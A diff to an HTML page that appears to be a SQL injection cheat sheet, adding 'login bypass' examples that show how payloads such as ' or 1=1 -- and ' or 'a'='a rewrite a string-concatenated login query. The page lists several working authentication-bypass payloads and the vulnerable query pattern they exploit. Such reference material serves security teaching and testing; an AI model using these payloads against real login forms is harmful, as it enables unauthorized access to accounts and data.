@@ -230,6 +230,7 @@ layout: default
             <td>Bypass login</td>
             <td>
                 ' or 1=1 --<br>' or 1=1-- -<br>' or 1=1-- -;<br>a' or 1=1 --<br>" or 1=1 --<br>a" or 1=1 --<br>' or 1=1 #<br>" or 1=1 #<br>or 1=1 --<br>' or 'x'='x<br>" or "x"="x<br>') or ('x'='x<br>") or ("x"="x<br>' or username LIKE '%admin%<br>
+                <li>Login bypass examples:</li>
                 <table>
                     <tr>
                         <td>USERNAME:</td>
@@ -238,6 +239,13 @@ layout: default
                     <tr>
                         <td>PASSWORD:</td>
                         <td>'#</td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
+                            <br>turns into:<br>
+                            <li>SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'</li>
+                        </td>
                     </tr>
                     <tr>
                         <td> </td>
@@ -250,6 +258,13 @@ layout: default
                     <tr>
                         <td>PASSWORD:</td>
                         <td>&lt;anything&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
+                            <br>turns into:<br>
+                            <li>SELECT * FROM users WHERE username = '' or 1=1 -- AND password = '&lt;anything&gt;'</li>
+                        </td>
                     </tr>
                 </table>
             </td>
